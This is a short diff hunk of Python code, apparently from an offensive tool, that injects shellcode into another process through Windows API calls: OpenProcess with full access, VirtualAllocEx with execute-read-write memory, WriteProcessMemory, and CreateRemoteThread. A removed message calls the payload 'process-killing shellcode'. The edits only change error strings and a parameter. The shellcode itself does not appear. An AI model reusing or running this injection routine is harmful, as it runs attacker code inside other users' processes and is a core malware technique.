@@ -25,11 +25,10 @@
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
 
         if not h_process:
-            return "Error: Couldn't acquire a handle to PID {}".format(pid)
+            return "[!] Error: Couldn't acquire a handle to PID {}".format(pid)
         arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
-        written = c_int(0)
-        kernel32.WriteProcessMemory(h_process, arg_address, sc, code_size, byref(written))
+        kernel32.WriteProcessMemory(h_process, arg_address, sc, code_size, 0)
         thread_id = c_ulong(0)
         if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
-            return "[*] Failed to inject process-killing shellcode. Exiting."
+            return "[!] Failed to create thread."
         return "[*] Remote thread created."
